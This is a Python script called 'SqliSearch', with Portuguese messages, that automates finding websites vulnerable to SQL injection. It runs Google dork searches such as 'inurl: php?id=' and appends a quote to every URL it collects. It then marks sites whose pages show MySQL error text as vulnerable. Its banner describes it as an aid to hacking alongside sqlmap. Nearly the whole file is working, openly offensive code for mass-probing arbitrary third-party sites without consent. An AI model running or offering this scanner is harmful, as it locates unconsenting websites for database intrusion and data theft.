#!/usr/bin/python3

import requests
import argparse
from os import system
from colorama import Fore, Style
from time import sleep
import googlesearch
from dankware import align
import subprocess

platform = subprocess.run("uname -o", stdout=subprocess.PIPE, shell=True)

parse = argparse.ArgumentParser(description="SqliSearch")
parse.add_argument("-s", "--search", type=str, help="pesquisa algo especifico")
parse.add_argument("-u", "--url", type=str, help="passe uma url para testar sqli")

args   = parse.parse_args()
search = args.search
url    = args.url

bannerString = """
███████╗ ██████╗ ██╗     ██╗███████╗███████╗ █████╗ ██████╗  ██████╗██╗  ██╗
██╔════╝██╔═══██╗██║     ██║██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║
███████╗██║   ██║██║     ██║███████╗█████╗  ███████║██████╔╝██║     ███████║
╚════██║██║▄▄ ██║██║     ██║╚════██║██╔══╝  ██╔══██║██╔══██╗██║     ██╔══██║
███████║╚██████╔╝███████╗██║███████║███████╗██║  ██║██║  ██║╚██████╗██║  ██║
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝

"""

bannerAndroid = """
        ███████  ██████  ██      ██ 
        ██      ██    ██ ██      ██ 
        ███████ ██    ██ ██      ██ 
             ██ ██ ▄▄ ██ ██      ██ 
        ███████  ██████  ███████ ██ 
                    ▀▀              
███████ ███████  █████  ██████   ██████ ██   ██ 
██      ██      ██   ██ ██   ██ ██      ██   ██ 
███████ █████   ███████ ██████  ██      ███████ 
     ██ ██      ██   ██ ██   ██ ██      ██   ██ 
███████ ███████ ██   ██ ██   ██  ██████ ██   ██ 
                                                
"""

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "accept-language": "pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "referer": "https://google.com/",
}

def banner():
    system("clear")
    if "android" in str(platform.stdout.lower()):
        print(align(f"{Fore.YELLOW}{Style.BRIGHT}{bannerAndroid}{Style.RESET_ALL}"))
    else:
        print(align(f"{Fore.YELLOW}{Style.BRIGHT}{bannerString}{Style.RESET_ALL}"))
    print(align(f"{Fore.YELLOW}[-]              Version: 1.0.0              [-]{Fore.RESET}"))
    print(align(f"{Fore.YELLOW}[-]          Author: Carlos Alberto          [-]{Fore.RESET}"))
    print(align(f"{Fore.YELLOW}[-]   GitHub: www.github.com/CarlosAllberto  [-]{Fore.RESET}"))
    print(align(f"[*]            *****************             [*]"))
    print(align(f"{Fore.RED}SqliScan is an automation in python \nto facilitate the search of sites vulnerable to sql injection. \nit also helps when hacking using gui with tkinter and sqlmap. \ni hope it helps you.{Fore.RESET}\n"))

class SqliSearch:
    def __init__(self):
        pass

    def checkNet(self):
        try:
            requests.get("https://http.cat", headers=headers)
        except:
            print(f"{Fore.RED}[-] internet: OFF{Fore.RESET}")
            exit()
        else:
            pass

    def checkFile(self):
        try:
            dorksFile = open("./dorksFile.txt", "r")
            dorksFile.close()
        except:
            print(f"{Fore.RED}[-] arquivo com dorks não encontrado{Fore.RESET}")
            print(f"{Fore.RED}tente criar: dorksFile.txt{Fore.RESET}\n")

    def testSqli(self, url):
        rq = requests.session()
        try:
            response = rq.get(f"{url}\'", headers=headers, timeout=10)
            if "mysql_fetch_array()" in response.text or "MySQL" in response.text:
                if "android" in str(platform.stdout.lower()):
                    print(f"{Fore.GREEN}[+] {url}{Fore.RESET}\n")
                else:
                    print(f"{Fore.GREEN}[+] {'Vulnerable!:':<15}{url}{Fore.RESET}\n")
            else:
                if "android" in str(platform.stdout.lower()):
                    print(f"[-] {url}\n")
                else:
                    print(f"[-] {'Not Vuln:':<15}{url}\n")
        except:
            pass

    def main(self):
        banner()
        self.checkNet()
        self.checkFile()
        cont = 0
        if search != None:
            dork = "inurl: php?id="
            try:
                results = googlesearch.search(f"{search} {dork}", num_results=100)
                for url in results:
                    self.testSqli(url)
                    if cont == 20:
                        cont = 0
                        print(align(f"{Fore.CYAN}sleeping for 120 seconds, be patient please. \t(ᴗ˳ᴗ) zzZZzzZZ{Fore.RESET}\n"))
                        sleep(120)
                    else:
                        sleep(1)
                    cont += 1

            except KeyboardInterrupt:
                print("saindo\n")
                exit()
            except ConnectionRefusedError:
                print("tente usar uma vpn.\n")
                exit()
            except:
                pass

        else:
            dorksFile = open("dorksFile.txt", "r").read().split()
            for dork in dorksFile:
                try:
                    results = googlesearch.search(dork, num_results=20)
                    for url in results:
                        self.testSqli(url)
                        sleep(1)
                    print(align(f"{Fore.CYAN}[Z] sleeping for 120 seconds, be patient please. \t(ᴗ˳ᴗ) zzZZzzZZ{Fore.RESET}\n"))
                    sleep(120)
                except KeyboardInterrupt:
                    print("saindo\n")
                    exit()
                except ConnectionRefusedError:
                    print("tente usar uma vpn.\n")
                    exit()
                except:
                    pass

if __name__ == "__main__":
    if url != None:
        print("\nem breve....  :)\n")
    else: 
        SqliSearch().main()
